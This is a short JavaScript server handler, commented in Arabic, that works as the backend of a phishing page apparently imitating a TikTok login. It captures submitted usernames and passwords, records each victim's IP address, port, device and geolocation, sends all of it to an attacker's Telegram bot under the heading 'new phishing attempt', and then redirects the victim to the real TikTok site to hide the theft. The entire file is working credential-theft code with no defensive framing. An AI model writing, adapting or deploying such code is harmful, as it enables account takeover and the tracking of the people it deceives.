const axios = require('axios');

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { username, password } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const port = req.socket.remotePort;
        const userAgent = req.headers['user-agent'];

        const geoResponse = await axios.get(`https://ipapi.co/${ip}/json/`).catch(() => ({ data: {} }));
        const geo = geoResponse.data;

        const report = `
🚨 **محاولة تصيد جديدة** 🚨
👤 المستخدم: ${username}
🔑 كلمة السر: ${password}
-----------------------
🌐 **البصمة:** IP: ${ip}, Port: ${port}
📱 الجهاز: ${userAgent}
📍 الموقع: ${geo.city}, ${geo.country_name}
`;

        try {
            await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
                chat_id: process.env.CHAT_ID,
                text: report
            });
        } catch (e) {
            console.error("Error sending to Telegram");
        }

        // تحويل المستخدم لموقع تيك توك الرسمي
        return res.status(302).setHeader('Location', 'https://www.tiktok.com').send();
    }
    
    return res.status(405).send('Method Not Allowed');
}
